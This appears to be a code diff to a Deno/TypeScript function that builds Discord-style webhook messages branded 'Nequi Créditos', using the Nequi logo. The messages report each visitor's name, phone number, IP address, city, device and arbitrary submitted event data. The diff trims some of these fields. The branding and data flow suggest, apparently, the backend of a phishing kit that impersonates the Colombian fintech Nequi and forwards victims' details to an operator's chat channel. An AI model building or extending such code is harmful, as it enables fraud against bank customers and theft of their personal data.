@@ -120,22 +120,6 @@ function buildEmbed(
   ip: string,
   timestamp: string,
 ) {
-  const color = COLORS[payload.type]
-  const statusEmoji: Record<string, string> = {
-    success: "✅",
-    warning: "⚠️",
-    error: "❌",
-    info: "ℹ️",
-    security: "🚨",
-  }
-  const typeLabel: Record<string, string> = {
-    success: "Exitoso",
-    warning: "Advertencia",
-    error: "Error",
-    info: "Información",
-    security: "Alerta de Seguridad",
-  }
-
   const fields: Array<{ name: string; value: string; inline?: boolean }> = []
 
   // User info
@@ -143,10 +127,7 @@ function buildEmbed(
     const u = payload.user
     const userLines = [
       u.name ? `**Nombre:** ${u.name}` : null,
-      u.email ? `**Correo:** ${u.email}` : null,
       u.phone ? `**Teléfono:** ${u.phone}` : null,
-      u.id ? `**ID:** \`${u.id}\`` : null,
-      u.role ? `**Rol:** ${u.role}` : null,
     ].filter(Boolean)
 
     if (userLines.length > 0) {
@@ -155,54 +136,28 @@ function buildEmbed(
   }
 
   // Connection info
+  const connLines = [`**IP:** \`${ip}\``]
+  if (geo.city) connLines.push(`**Ciudad:** ${geo.city}`)
+  connLines.push(`**Dispositivo:** ${parsedUA.device}`)
   fields.push({
     name: "🌐 Conexión",
-    value: [
-      `**IP:** \`${ip}\``,
-      geo.country_name ? `**País:** ${geo.country_name}` : null,
-      geo.city ? `**Ciudad:** ${geo.city}` : null,
-      geo.region ? `**Región:** ${geo.region}` : null,
-      `**Navegador:** ${parsedUA.browser}`,
-      `**Sistema Operativo:** ${parsedUA.os}`,
-      `**Dispositivo:** ${parsedUA.device}`,
-    ].filter(Boolean).join("\n"),
+    value: connLines.join("\n"),
     inline: false,
   })
 
-  // Event info
-  const eventLines = [
-    `**Tipo:** ${payload.eventName}`,
-    `**Descripción:** ${payload.description}`,
-  ]
+  // Event data
   if (payload.data) {
+    const dataLines: string[] = []
     Object.entries(payload.data).forEach(([k, v]) => {
-      eventLines.push(`**${k}:** ${v}`)
+      dataLines.push(`**${k}:** ${v}`)
     })
+    fields.push({ name: "⚡ Evento", value: dataLines.join("\n"), inline: false })
   }
-  fields.push({ name: "⚡ Evento", value: eventLines.join("\n"), inline: false })
 
   // Date
   fields.push({
     name: "🕒 Fecha y Hora",
     value: timestamp,
-    inline: true,
-  })
-
-  // System
-  fields.push({
-    name: "📊 Sistema",
-    value: [
-      `**Entorno:** ${Deno.env.get("APP_ENV") || "Producción"}`,
-      `**App:** Nequi Créditos`,
-      `**Versión:** ${payload.version || "1.0.0"}`,
-    ].join("\n"),
-    inline: true,
-  })
-
-  // Status
-  fields.push({
-    name: "📌 Estado",
-    value: `${statusEmoji[payload.type]} **${typeLabel[payload.type]}**`,
     inline: false,
   })
 
@@ -211,13 +166,9 @@ function buildEmbed(
     avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Nequi_Logo.svg/1200px-Nequi_Logo.svg.png",
     embeds: [
       {
-        title: `📌 NUEVO EVENTO — ${payload.eventName.toUpperCase()}`,
-        color,
+        title: `📌 ${payload.eventName.toUpperCase()}`,
+        color: COLORS[payload.type],
         fields,
-        footer: {
-          text: "Nequi Créditos · Sistema de monitoreo en tiempo real",
-        },
-        timestamp: new Date().toISOString(),
       },
     ],
   }
